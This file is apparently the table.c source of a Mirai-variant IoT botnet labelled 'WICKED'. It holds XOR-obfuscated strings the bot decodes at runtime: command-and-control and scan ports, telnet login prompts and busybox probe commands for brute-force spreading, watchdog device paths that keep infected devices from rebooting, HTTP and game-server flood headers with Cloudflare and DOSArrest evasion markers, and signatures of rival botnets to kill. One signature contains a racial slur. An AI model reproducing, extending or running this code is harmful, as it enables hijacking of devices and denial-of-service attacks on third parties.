#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0x1337c0d3;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x22\x84", 2); // 5555
    add_entry(TABLE_SCAN_CB_PORT, "\x75\x43", 2); // 17012
    add_entry(TABLE_EXEC_SUCCESS, "\x78\x5F\x17\x40\x52\x5B\x5B\x19\x19\x19\x37", 11); // Oh well...

    add_entry(TABLE_SCAN_SHELL, "\x44\x5F\x52\x5B\x5B\x37", 6); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x52\x59\x56\x55\x5B\x52\x37", 7); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x44\x4E\x44\x43\x52\x5A\x37", 7); // system
    add_entry(TABLE_SCAN_SH, "\x64\x7F\x37", 3); // sh
    add_entry(TABLE_SCAN_QUERY, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x60\x7E\x74\x7C\x72\x73\x37", 20); // /bin/busybox WICKED
    add_entry(TABLE_SCAN_RESP, "\x60\x7E\x74\x7C\x72\x73\x0D\x17\x56\x47\x47\x5B\x52\x43\x17\x59\x58\x43\x17\x51\x58\x42\x59\x53\x37", 25); // WICKED: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x59\x54\x58\x45\x45\x52\x54\x43\x37", 9); // ncorrect
    add_entry(TABLE_SCAN_PS, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x47\x44\x37", 16); // /bin/busybox ps
    add_entry(TABLE_SCAN_KILL_9, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x5C\x5E\x5B\x5B\x17\x1A\x0E\x37", 22); // /bin/busybox kill -9
    add_entry(TABLE_SCAN_OGIN, "\x58\x50\x5E\x59\x37", 5); // ogin
    add_entry(TABLE_SCAN_ENTER, "\x52\x59\x43\x52\x45\x37", 6); // enter
    add_entry(TABLE_SCAN_ASSWORD, "\x56\x44\x44\x40\x58\x45\x53\x37", 8); // assword
    
    add_entry(TABLE_KILLER_PROC, "\x18\x47\x45\x58\x54\x18\x37", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x18\x52\x4F\x52\x37", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x18\x51\x53\x37", 4); // /fd
    add_entry(TABLE_KILLER_MAPS, "\x18\x5A\x56\x47\x44\x37", 6); // /maps
    add_entry(TABLE_KILLER_TCP, "\x18\x47\x45\x58\x54\x18\x59\x52\x43\x18\x43\x54\x47\x37", 14); // /proc/net/tcp

    add_entry(TABLE_IOCTL_KEEPALIVE1, "\x18\x53\x52\x41\x18\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 14); // /dev/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE2, "\x18\x53\x52\x41\x18\x5A\x5E\x44\x54\x18\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 19); // /dev/misc/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE3, "\x18\x53\x52\x41\x18\x71\x63\x60\x73\x63\x06\x07\x06\x68\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE4, "\x18\x53\x52\x41\x18\x71\x63\x60\x73\x63\x06\x07\x06\x6B\x17\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 24); // /dev/FTWDT101\ watchdog
    
    add_entry(TABLE_RANDOM, "\x4D\x71\x71\x64\x0E\x4E\x55\x59\x07\x74\x54\x5A\x56\x01\x59\x74\x7A\x0E\x05\x60\x5F\x7B\x6D\x7E\x40\x50\x76\x5A\x6D\x43\x7F\x0F\x46\x60\x4D\x06\x41\x41\x63\x70\x7D\x7F\x7D\x43\x72\x62\x04\x5B\x73\x0F\x00\x54\x7E\x61\x6F\x65\x01\x7A\x7A\x0E\x5A\x07\x0F\x67\x37", 65); // zFFS9ybn0Ccma6nCM92WhLZIwgAmZtH8qWz1vvTGJHJtEU3lD87cIVXR6MM9m08P
    
    add_entry(TABLE_ATK_SET_COOKIE, "\x44\x52\x43\x74\x58\x58\x5C\x5E\x52\x1F\x10\x37", 12);																													// "setCookie('"
    add_entry(TABLE_ATK_REFRESH_HDR, "\x45\x52\x51\x45\x52\x44\x5F\x0D\x37", 9);																																// "refresh:"
    add_entry(TABLE_ATK_LOCATION_HDR, "\x5B\x58\x54\x56\x43\x5E\x58\x59\x0D\x37", 10);																															// "location:"
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x44\x52\x43\x1A\x54\x58\x58\x5C\x5E\x52\x0D\x37", 12);																												// "set-cookie:"
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x54\x58\x59\x43\x52\x59\x43\x1A\x5B\x52\x59\x50\x43\x5F\x0D\x37", 16);																							// "content-length:"
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x43\x45\x56\x59\x44\x51\x52\x45\x1A\x52\x59\x54\x58\x53\x5E\x59\x50\x0D\x37", 19);																				// "transfer-encoding:"
    add_entry(TABLE_ATK_CHUNKED, "\x54\x5F\x42\x59\x5C\x52\x53\x37", 8);																																		// "chunked"
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x5C\x52\x52\x47\x1A\x56\x5B\x5E\x41\x52\x37", 11);																													// "keep-alive"
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x54\x58\x59\x59\x52\x54\x43\x5E\x58\x59\x0D\x37", 12);																												// "connection:"
    add_entry(TABLE_ATK_DOSARREST, "\x44\x52\x45\x41\x52\x45\x0D\x17\x53\x58\x44\x56\x45\x45\x52\x44\x43\x37", 18);																								// "server: dosarrest"
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x44\x52\x45\x41\x52\x45\x0D\x17\x54\x5B\x58\x42\x53\x51\x5B\x56\x45\x52\x1A\x59\x50\x5E\x59\x4F\x37", 25);															// "server: cloudflare-nginx"

    add_entry(TABLE_ATK_KEEP_ALIVE, "\x74\x58\x59\x59\x52\x54\x43\x5E\x58\x59\x0D\x17\x5C\x52\x52\x47\x1A\x56\x5B\x5E\x41\x52\x37", 23);           																// "Connection: keep-alive" 
	add_entry(TABLE_ATK_ACCEPT, "\x76\x54\x54\x52\x47\x43\x0D\x17\x43\x52\x4F\x43\x18\x5F\x43\x5A\x5B\x1B\x56\x47\x47\x5B\x5E\x54\x56\x43\x5E\x58\x59\x18\x4F\x5F\x43\x5A\x5B\x1C\x4F\x5A\x5B\x1B\x56\x47\x47\x5B\x5E\x54\x56\x43\x5E\x58\x59\x18\x4F\x5A\x5B\x0C\x46\x0A\x07\x19\x0E\x1B\x5E\x5A\x56\x50\x52\x18\x40\x52\x55\x47\x1B\x1D\x18\x1D\x0C\x46\x0A\x07\x19\x0F\x37", 83); // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
	add_entry(TABLE_ATK_ACCEPT_LNG, "\x76\x54\x54\x52\x47\x43\x1A\x7B\x56\x59\x50\x42\x56\x50\x52\x0D\x17\x52\x59\x1A\x62\x64\x1B\x52\x59\x0C\x46\x0A\x07\x19\x0F\x37", 32); // "Accept-Language: en-US,en;q=0.8"
	add_entry(TABLE_ATK_CONTENT_TYPE, "\x74\x58\x59\x43\x52\x59\x43\x1A\x63\x4E\x47\x52\x0D\x17\x56\x47\x47\x5B\x5E\x54\x56\x43\x5E\x58\x59\x18\x4F\x1A\x40\x40\x40\x1A\x51\x58\x45\x5A\x1A\x42\x45\x5B\x52\x59\x54\x58\x53\x52\x53\x37", 48); // "Content-Type: application/x-www-form-urlencoded"
	add_entry(TABLE_ATK_HTTP, "\x7F\x63\x63\x67\x18\x06\x19\x06\x37", 9); // "HTTP/1.1"
	add_entry(TABLE_ATK_USERAGENT, "\x62\x44\x52\x45\x1A\x76\x50\x52\x59\x43\x0D\x37", 12); // "User-Agent:"
	add_entry(TABLE_ATK_HOST, "\x7F\x58\x44\x43\x0D\x37", 6); // "Host:"
	add_entry(TABLE_ATK_COOKIE, "\x74\x58\x58\x5C\x5E\x52\x0D\x37", 8); // "Cookie:"
	add_entry(TABLE_ATK_SEARCHHTTP, "\x5F\x43\x43\x47\x37", 5); // "http"
	add_entry(TABLE_ATK_URL, "\x42\x45\x5B\x0A\x37", 5); // "url="
	add_entry(TABLE_ATK_POST, "\x67\x78\x64\x63\x37", 5); // "POST"

    add_entry(TABLE_ATK_VSE, "\x63\x64\x58\x42\x45\x54\x52\x17\x72\x59\x50\x5E\x59\x52\x17\x66\x42\x52\x45\x4E\x37", 21); // TSource Engine Query
    add_entry(TABLE_ATK_RESOLVER, "\x18\x52\x43\x54\x18\x45\x52\x44\x58\x5B\x41\x19\x54\x58\x59\x51\x37", 17); // /etc/resolv.conf
    add_entry(TABLE_ATK_NSERV, "\x59\x56\x5A\x52\x44\x52\x45\x41\x52\x45\x37", 11); // nameserver

    add_entry(TABLE_EXEC_MIRAI, "\x53\x41\x45\x7F\x52\x5B\x47\x52\x45\x37", 10);                                // dvrHelper
    add_entry(TABLE_EXEC_MANA, "\x59\x4E\x56\x37", 4);                                                          // nya
    add_entry(TABLE_EXEC_SORA1, "\x64\x78\x06\x0E\x07\x7E\x5D\x06\x6F\x37", 10);                                // SO190Ij1X
    add_entry(TABLE_EXEC_SORA2, "\x79\x5E\x70\x70\x52\x65\x01\x0E\x4F\x53\x37", 11);                            // NiGGeR69xd
    add_entry(TABLE_EXEC_SORA3, "\x06\x04\x04\x00\x64\x58\x45\x56\x7B\x78\x76\x73\x72\x65\x37", 15);            // 1337SoraLOADER
    add_entry(TABLE_EXEC_OWARI, "\x7E\x42\x6E\x50\x42\x5D\x52\x7E\x46\x59\x37", 11);                            // IuYgujeIqn
    add_entry(TABLE_EXEC_JOSHO, "\x06\x03\x71\x56\x37", 5);                                                     // 14Fa
    add_entry(TABLE_EXEC_APOLLO, "\x54\x54\x76\x73\x37", 5);                                                    // ccAD
    add_entry(TABLE_EXEC_HOHO, "\x7F\x78\x7F\x78\x1A\x62\x00\x0E\x78\x7B\x37", 11);                             // HOHO-U79OL
    add_entry(TABLE_EXEC_ARES, "\x19\x56\x45\x52\x44\x37", 6);                                                  // .ares
    add_entry(TABLE_EXEC_YAKUZA, "\x4E\x56\x5C\x42\x41\x03\x41\x4F\x54\x37", 10);                               // yakuv4vxc
    add_entry(TABLE_EXEC_APEX, "\x5F\x5E\x5C\x56\x45\x5E\x40\x56\x44\x5F\x52\x45\x52\x37", 14);                 // hikariwashere
    add_entry(TABLE_EXEC_OWARI2, "\x6F\x06\x0E\x7E\x05\x04\x0E\x06\x05\x03\x62\x7E\x62\x37", 14);               // X19I239124UIU
    add_entry(TABLE_EXEC_HITOLEAKED, "\x40\x45\x50\x59\x42\x40\x45\x5E\x5D\x58\x37", 11);                       // wrgnuwrijo
    add_entry(TABLE_EXEC_HORIZON, "\x51\x4F\x5B\x4E\x56\x4D\x44\x4F\x5F\x4E\x37", 11);                          // fxlyazsxhy
    add_entry(TABLE_EXEC_HOHO2, "\x7F\x78\x7F\x78\x1A\x7B\x62\x70\x78\x00\x37", 11);                            // HOHO-LUGO7
    add_entry(TABLE_EXEC_GEMINI, "\x47\x03\x07\x05\x0E\x4F\x0E\x06\x4F\x4F\x37", 11);                           // p4029x91xx
    add_entry(TABLE_EXEC_HYBRID, "\x79\x5E\x70\x70\x52\x65\x01\x0E\x4F\x53\x37", 11);                           // NiGGeR69xd
    add_entry(TABLE_EXEC_SATAN, "\x73\x72\x7A\x78\x79\x64\x1A\x7B\x62\x70\x78\x00\x37", 13);                    // DEMONS-LUGO7
    add_entry(TABLE_EXEC_ORPHIC, "\x51\x4F\x5B\x4E\x56\x4D\x44\x4F\x5F\x4E\x37", 11);                           // fxlyazsxhy
    add_entry(TABLE_EXEC_ZAPON, "\x7F\x56\x45\x5E\x37", 5);                                                     // Hari
    add_entry(TABLE_EXEC_OBBO, "\x58\x55\x55\x58\x37", 5);                                                      // obbo
    add_entry(TABLE_EXEC_MYTH, "\x5A\x4E\x43\x5F\x37", 5);                                                      // myth
    add_entry(TABLE_EXEC_ASHER, "\x50\x52\x59\x52\x37", 5);                                                     // gene
    add_entry(TABLE_EXEC_KALON, "\x5D\x59\x44\x53\x0E\x44\x53\x58\x5E\x5B\x56\x37", 12);                        // jnsd9sdoila
    add_entry(TABLE_EXEC_YUKARI, "\x5B\x4D\x45\x53\x37", 5);                                                    // lzrd
    add_entry(TABLE_EXEC_GREEKS, "\x75\x4D\x64\x4F\x7B\x4F\x75\x4F\x52\x6E\x37", 11);                           // BzSxLxBxeY
    add_entry(TABLE_EXEC_RAZOR, "\x45\x56\x4D\x45\x37", 5);                                                     // razr
    

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

